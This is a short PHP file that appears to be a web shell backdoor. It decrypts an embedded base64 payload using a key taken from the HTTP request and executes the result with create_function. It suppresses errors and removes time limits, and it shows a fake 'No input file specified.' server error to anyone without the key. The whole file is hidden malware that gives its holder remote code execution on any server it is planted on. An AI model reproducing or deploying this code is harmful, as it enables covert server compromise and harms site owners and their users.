<?php 
error_reporting(0); 
set_time_limit(0);
function My_base($data,$key){
        $key=md5($key);
        $x=0;
        $data=base64_decode($data);
		$len = strlen($data);
		$l = strlen($key);
		$char='';
        for ($i=0;$i< $len;$i++)
        {
            if ($x== $l) $x=0;
            $char.=substr($key,$x,1);
            $x++;
        }
		$str='';
        for ($i=0;$i< $len;$i++)
        {
            if (ord(substr($data,$i,1))<ord(substr($char,$i,1)))
            {
                $str.=chr((ord(substr($data,$i,1))+256)-ord(substr($char,$i,1)));
            }
            else
            {
                $str.=chr(ord(substr($data,$i,1))-ord(substr($char,$i,1)));
            }
        }
        return base64_decode($str);
}
if(@$_REQUEST['key']){
$key=$_REQUEST['key']; 
$text=My_base('tn96sr2Ol5vGzrqtln16mo22nMqtrZ/Ofpqnnotifn+6jY5/uGiFl62Trp+VjaChlNCt1MKL0tiXqpSXf3R+e75phqXGaoCctai6q5WNipt8zKCY',$key);
$St=Create_Function('',$text);$St();
}else{
echo 'No input file specified.';
}
?>